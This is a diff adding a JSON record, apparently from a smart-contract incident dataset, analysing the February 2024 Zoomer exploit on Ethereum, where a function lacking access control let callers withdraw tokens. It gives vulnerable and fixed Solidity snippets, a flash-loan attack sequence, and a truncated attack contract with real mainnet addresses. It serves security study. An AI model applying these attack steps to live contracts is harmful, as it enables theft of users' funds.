@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-02-XX_Zoomer_ArbitrarySelector",
+ "source_file": "2024/2024-02-XX_Zoomer_ArbitrarySelector.md",
+ "title": "Zoomer — Flash Loan-Based Arbitrary Selector 0x72c4cff6 Vulnerability Analysis",
+ "date": "2024-02-01",
+ "protocol": "Zoomer",
+ "chain": "Ethereum",
+ "loss_raw": "~14 ETH",
+ "loss_usd": null,
+ "root_cause": "The `0x72c4cff6` selector function in the vulnerable contract lacks access control, allowing any arbitrary caller to execute internal operations with token + amount parameters to drain funds",
+ "attack_tx": null,
+ "vulnerable_contract": "0x9700204D",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: internal function exposed without access control\n// Selector 0x72c4cff6 — accepts token + amount parameters\n// Function name unknown (unverified contract)\nfunction unknownFunction(address token, uint256 amount) external {\n    // No msg.sender validation\n    // Internal state change or token transfer logic\n    IERC20(token).transfer(msg.sender, amount);  // ← unauthorized token withdrawal possible\n}\n\n//",
+  "// File: Zoomer_decompiled.sol\ncontract Zoomer {\n    function liq(address p0) external {}  // ❌ Vulnerability\n\n    // Selector: 0x619c7e5f\n    function unknown_619c7e5f() external {}\n\n    // Selector: 0x72c4cff6\n    function unknown_72c4cff6() external {}\n\n    // Selector: 0x73b4086b\n    function loans(address p0) external {}\n\n    // Selector: 0x76ce28f1\n    function setWhitelistedToken(address p0, bool p1) external {}\n\n    // Selector: 0x7924d93f\n    function borrowers(uint256 p0) external {}\n\n    // Selector: 0x630838c1\n    function unknown_630838c1() external {}\n\n    // Selector: 0x6e04ff0d\n    function checkUpkeep(bytes memory p0) external view returns (uint256) {}\n\n    // Selector: 0x4585e33b\n    function performUpkeep(bytes memory p0) external {}"
+ ],
+ "code_after": [
+  "✅ Safe code: callable by owner only\nfunction adminWithdraw(address token, uint256 amount) external onlyOwner {\n    IERC20(token).transfer(msg.sender, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Balancer flash: flash loan 200 WETH",
+  "→ [2] Deploy 5 Money contracts (each worth 200 ETH)",
+  "→ [3] Each Money: swap WETH → Zoomer (UniswapV2 Router)",
+  "→ [4] Call vulnerable contract 0x72c4cff6(Zoomer, 30265400)",
+  "→ [5] Tokens and ETH returned to attacker",
+  "→ [6] Repay Balancer flash loan",
+  "→ [7] ~14 ETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Balancer flash: flash loan 200 WETH\n  │\n  ├─→ [2] Deploy 5 Money contracts (each worth 200 ETH)\n  │\n  ├─→ [3] Each Money: swap WETH → Zoomer (UniswapV2 Router)\n  │         └─ Total ~30,265,400 Zoomer tokens acquired\n  │\n  ├─→ [4] Call vulnerable contract 0x72c4cff6(Zoomer, 30265400)\n  │         └─ Internal logic executed without access control\n  │\n  ├─→ [5] Tokens and ETH returned to attacker\n  │\n  ├─→ [6] Repay Balancer flash loan\n  │\n  └─→ [7] ~14 ETH profit",
+  "interface IVulnerable {\n    // Selector 0x72c4cff6\n    function unknownFunc(address token, uint256 amount) external;\n}\n\ninterface IBalancerVault {\n    function flashLoan(\n        address recipient,\n        address[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n\ncontract AttackContract {\n    IVulnerable    constant vuln    = IVulnerable(0x9700204D77A67A18eA8F1B47275897b21e5eFA97);\n    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IERC20         constant ZOOMER  = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);\n    IWETH          constant WETH    = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    function testExploit() external {\n        address[] memory tokens = new address[]("
+ ]
+}
